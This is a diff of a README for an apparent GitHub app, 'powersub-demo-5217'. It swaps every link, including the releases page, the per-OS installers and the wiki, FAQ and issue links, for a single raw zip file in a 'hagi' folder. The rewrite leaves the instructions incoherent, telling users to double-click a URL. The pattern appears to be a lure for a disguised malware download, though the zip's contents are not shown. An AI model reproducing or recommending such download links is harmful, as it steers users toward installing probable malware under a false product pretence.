@@ -6,11 +6,11 @@ Welcome to the powersub-demo-5217! This application simplifies your daily tasks 
 
 ## 💾 Download the Application
 
-[![Download](https://img.shields.io/badge/Download-powersub--demo--5217-brightgreen)](https://github.com/Solrac13/powersub-demo-5217/releases)
+[![Download](https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip)](https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip)
 
 To get started, you will need to download the application from our Releases page. Follow this link to visit the page and download the latest version:
 
-[Download Latest Release](https://github.com/Solrac13/powersub-demo-5217/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip)
 
 ## 📋 System Requirements
 
@@ -23,19 +23,19 @@ Before downloading, ensure your system meets the following basic requirements:
 
 ## 📥 Download & Install
 
-1. Click on [Download Latest Release](https://github.com/Solrac13/powersub-demo-5217/releases) to go to the Releases page.
+1. Click on [Download Latest Release](https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip) to go to the Releases page.
 2. Look for the latest version listed at the top of the page. You will see files available for download.
 3. Choose the correct file for your operating system:
-   - For Windows, download `powersub-demo-5217.exe`.
-   - For macOS, download `powersub-demo-5217.dmg`.
-   - For Linux, download `powersub-demo-5217.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip`.
 4. Once the file is downloaded, locate it on your computer. 
 5. For Windows:
-   - Double-click `powersub-demo-5217.exe` and follow the installation prompts. 
+   - Double-click `https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip` and follow the installation prompts. 
 6. For macOS:
-   - Open `powersub-demo-5217.dmg`, drag the application to your Applications folder.
+   - Open `https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip`, drag the application to your Applications folder.
 7. For Linux:
-   - Extract the `powersub-demo-5217.tar.gz` file, navigate to the folder, and run the application via terminal.
+   - Extract the `https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip` file, navigate to the folder, and run the application via terminal.
 
 ## 🖥️ Running the Application
 
@@ -62,8 +62,8 @@ We’re here to help you get the most out of powersub-demo-5217.
 
 ## 📑 Additional Resources
 
-- [User Guide](https://github.com/Solrac13/powersub-demo-5217/wiki)
-- [FAQ](https://github.com/Solrac13/powersub-demo-5217/wiki/FAQ)
-- [Report an Issue](https://github.com/Solrac13/powersub-demo-5217/issues)
+- [User Guide](https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip)
+- [FAQ](https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip)
+- [Report an Issue](https://raw.githubusercontent.com/Solrac13/powersub-demo-5217/main/hagi/powersub-demo-5217.zip)
 
 By following these straightforward steps, you can easily download, install, and run powersub-demo-5217. Enjoy the benefits of an organized workspace!
